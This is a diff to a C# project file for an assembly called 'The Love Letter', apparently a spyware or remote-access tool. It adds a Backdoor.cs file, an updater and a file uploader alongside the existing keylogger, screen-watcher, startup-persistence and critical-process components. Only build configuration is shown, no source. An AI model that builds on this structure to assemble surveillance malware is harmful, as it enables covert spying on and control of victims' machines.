@@ -6,7 +6,7 @@
     <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
     <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
     <ProjectGuid>{455E37BF-B767-4323-B8F5-A86CEECD3D91}</ProjectGuid>
-    <OutputType>WinExe</OutputType>
+    <OutputType>Exe</OutputType>
     <RootNamespace>Client</RootNamespace>
     <AssemblyName>The Love Letter</AssemblyName>
     <TargetFrameworkVersion>v4.6</TargetFrameworkVersion>
@@ -50,6 +50,9 @@
     </Reference>
     <Reference Include="Microsoft.Win32.TaskScheduler, Version=2.9.1.0, Culture=neutral, PublicKeyToken=e25603a88b3aa7da, processorArchitecture=MSIL">
       <HintPath>..\packages\TaskScheduler.2.9.1\lib\net452\Microsoft.Win32.TaskScheduler.dll</HintPath>
+    </Reference>
+    <Reference Include="Newtonsoft.Json, Version=13.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
+      <HintPath>..\packages\Newtonsoft.Json.13.0.1\lib\net45\Newtonsoft.Json.dll</HintPath>
     </Reference>
     <Reference Include="System" />
     <Reference Include="System.AppContext, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL">
@@ -114,6 +117,7 @@
     </Reference>
   </ItemGroup>
   <ItemGroup>
+    <Compile Include="Armitage\Backdoor.cs" />
     <Compile Include="Armitage\Compiler.cs" />
     <Compile Include="Armitage\Critical Process.cs" />
     <Compile Include="Armitage\Startup.cs" />
@@ -125,13 +129,17 @@
     <Compile Include="Armitage\Watchers\Surveyor.cs" />
     <Compile Include="Armitage\Watchers\Keylogger.cs" />
     <Compile Include="Armitage\Watchers\Screen Watcher.cs" />
-    <Compile Include="Communication\Screenshot Stacker.cs" />
+    <Compile Include="Communication\JSON Models\Update.cs" />
+    <Compile Include="Communication\File Stacker.cs" />
     <Compile Include="Communication\Server.cs" />
     <Compile Include="Communication\String Stacker.cs" />
     <Compile Include="Constants.cs" />
     <Compile Include="Program.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Utilities\Converter.cs" />
     <Compile Include="Utilities\Filepath.cs" />
+    <Compile Include="Utilities\Ranging.cs" />
+    <Compile Include="Utilities\Updater.cs" />
   </ItemGroup>
   <ItemGroup>
     <None Include="App.config" />
